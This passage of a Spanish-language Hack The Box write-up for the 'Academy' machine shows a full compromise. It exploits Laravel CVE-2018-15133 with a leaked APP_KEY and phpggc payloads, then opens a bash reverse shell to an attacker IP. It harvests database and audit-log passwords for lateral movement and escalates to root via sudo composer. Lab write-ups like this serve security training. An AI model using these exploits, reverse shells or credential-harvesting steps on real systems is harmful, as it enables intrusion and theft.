+<p>Utilizar la key filtrada y el payload para generar un token para inyectarlo posteriormente:</p>
+<blockquote>
+<p>./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGl......YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>PoC for Unserialize vulnerability in Laravel &lt;= 5.6.29 (CVE-2018-15133) by @kozmic
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>HTTP header for POST request: 
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>X-XSRF-TOKEN: eyJpdiI6ImpxNmxRZlV6Z0szekRVOE4xcVJwMFE9PSIsInZhbHVlIjoiSGZGXC9vVk1rY1M2dUFLdTVoNmpwOFNSZkpRQk1jTytCNjN6SUJUNFwvMEpJOFRcL2RYTVBOb1VoODl2VlBWOEl3dVJqb2hqaDdLUU5uSU9peGx5QWh3SEhIT29KaUVnK1Y0dDJBdm9vdkk4a3ozRjFJeVRMeDdXUkFyMkxmaDZTbXhLbWpBMGpON25Wb0RKTzVGWUpSRnNHbWR1K2xmR3l3Q1QweEc4Sm5oVkFaMCtSdENsSE9taVd3SmJuUnh6d1NsT1JzVWZKWHR3M0RJVjNnc2Juc25DS0pIOWx2blgxVFlxd0hCR3VaSXJOODc3ZTE5b1M2alcyK1J2SU9MWVh5VDBhbzgzRWg5XC9kbHc0ZTZOekdwVHRJSmQ4TUFRZXdHV2J0ZFVvcTN5WWtubTI2c0g2eFg5aTVvQVArbmhOSnp3IiwibWFjIjoiOWE0OTM4ODhkM2RlODgzMjljNjA0YWNlMjAxYjgyN2Q2ZjRlNjZjZmU1MmEyMmQxYzY4YjM2YjExODYwNzg3NiJ9
+</code></pre></div>
+</li>
+<li>
+<p>Inyección del token con Curl:</p>
+<blockquote>
+<p>curl -s http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6ImtoRnBzVDhVcHIrS......MjNlMTE2ZThkYWE3MGYwMWJlZmY1M2MxMDEzNzlmOTNlYTgyNzBmIn0='| head -n 1</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>www-data
+</code></pre></div>
+</li>
+<li>
+<p>Se lanza una shell reversa y se obtiene acceso como www-data:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>./phpggc laravel/rce3 system &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.11/443 0&gt;&amp;1&#39;&quot; -b
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>PoC for Unserialize vulnerability in Laravel &lt;= 5.6.29 (CVE-2018-15133) by @kozmic
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>HTTP header for POST request: 
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>X-XSRF-TOKEN: eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>curl -s http://dev-staging-01.academy.htb -X POST -H &#39;X-XSRF-TOKEN: eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9&#39;| head -n 1
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>nc -lvnp 443
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>    www-data@academy:/home$ whoami
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    www-data
+</code></pre></div>
+</li>
+</ul>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<ul>
+<li>
+<p>Se inspeccionan archivos y configuraciones:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>www-data@academy:/var/www/html/academy/public$ cat config.php 
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&lt;?php
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>ini_set(&#39;display_errors&#39;, 1);
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>ini_set(&#39;display_startup_errors&#39;, 1);
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>error_reporting(E_ALL);
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>$link=mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;GkEWXn4h34g8qx9fZ1&#39;,&#39;academy&#39;);
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>?&gt;
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>www-data@academy:/var/www/html/academy$ cat .env
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>APP_NAME=Laravel
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>APP_ENV=local
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>APP_DEBUG=false
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>APP_URL=http://localhost
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>LOG_CHANNEL=stack
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>DB_CONNECTION=mysql
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>DB_HOST=127.0.0.1
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>DB_PORT=3306
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>DB_DATABASE=academy
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>DB_USERNAME=dev
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>DB_PASSWORD=mySup3rP4s5w0rd!!
+</code></pre></div>
+</li>
+<li>
+<p>Revisando la bbdd se encuentra un hash que podría ser interesante, pero no sirve:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>mysql&gt; select * from users;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>+----+-----------------------------------+----------------------------------+--------+---------------------+
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>| id | username                          | password                         | roleid | created_at          |
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>+----+-----------------------------------+----------------------------------+--------+---------------------+
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>|  5 | dev                               | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
+</code></pre></div>
+</li>
+<li>
+<p>Se accede a otra sesión como cry0l1t3 con la password <strong>mySup3rP4s5w0rd!!</strong> y al estar en el grupo adm investigamos logs:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>cry0l1t3@academy:/var/log/audit$ grep -ri &#39;data=&#39; | awk &#39;{print $NF}&#39;| awk &#39;FS=&quot;=&quot; {print $2}&#39;| xxd -ps -r | less -S
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>mrb3n_Ac@d3my!
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>whoami
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>exit
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>/bin/bash -i
+</code></pre></div>
+</li>
+<li>
+<p>Se accede como mrb3n con password <strong>mrb3n_Ac@d3my!</strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cry0l1t3@academy:/var/log/audit$ su mrb3n
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Password: 
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>$ whoami
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>mrb3n
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalate-privileges-root">Escalate Privileges (root)</h2>
+<ul>
+<li>
+<p>Desde el usuario mrb3n se encuentran comandos que se puede ejecutan con sudo, se aprovecha para escalar:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo -l
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a> [sudo] password for mrb3n: 
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a> Matching Defaults entries for mrb3n on academy:
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a> User mrb3n may run the following commands on academy:
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    (ALL) /usr/bin/composer
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo /usr/bin/composer exec chmod 4755 /bin/bash
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a> PHP Warning:  PHP Startup: Unable to load dynamic library &#39;mysqli.so&#39; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>PHP Warning:  PHP Startup: Unable to load dynamic library &#39;pdo_mysql.so&#39; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Do not run Composer as root/super user! See https://getcomposer.org/root for details
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>mrb3n@academy:/var/www/html/htb-academy-dev-01$ /bin/bash -p
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a> bash-5.0# whoami
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a> oot
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a> bash-5.0# cat /root/root.txt 
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a> **1d0792525f28ddb9a968d7996a285dfc**
+</code></pre></div>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Introdución" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Introdución
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../bank/" class="md-footer__link md-footer__link--next" aria-label="Next: Bank" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Bank
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
